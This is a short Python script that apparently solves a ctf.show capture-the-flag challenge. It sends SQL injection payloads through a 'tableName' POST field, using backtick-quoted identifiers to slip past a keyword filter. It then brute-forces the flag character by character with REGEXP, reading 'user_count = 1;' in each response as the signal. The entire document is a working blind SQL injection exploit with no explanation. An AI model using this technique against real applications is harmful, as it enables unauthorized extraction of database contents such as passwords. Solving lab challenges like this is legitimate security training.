import requests

url = 'http://59418fd8-bd5f-4fd3-bc04-9997ef8ac8e4.challenge.ctf.show/select-waf.php'

flagstr = '1234567890asdfghjklqwertyuiopzxcvbnm-_{}'
flag = 'ctfshow{'

for i in range(50):
    for x in flagstr:
        data = {
            'tableName': f"`ctfshow_user`where`pass`regexp'{flag + x}'"
        }
        res = requests.post(url=url, data=data)
        if res.text.find('user_count = 1;') > 0:
            flag += x
            print('++++++++++++++++++++++++right:   ' + x)
            break
        else:
            print('+++++++++++++++++wrong:  ' + x)
    print(flag)
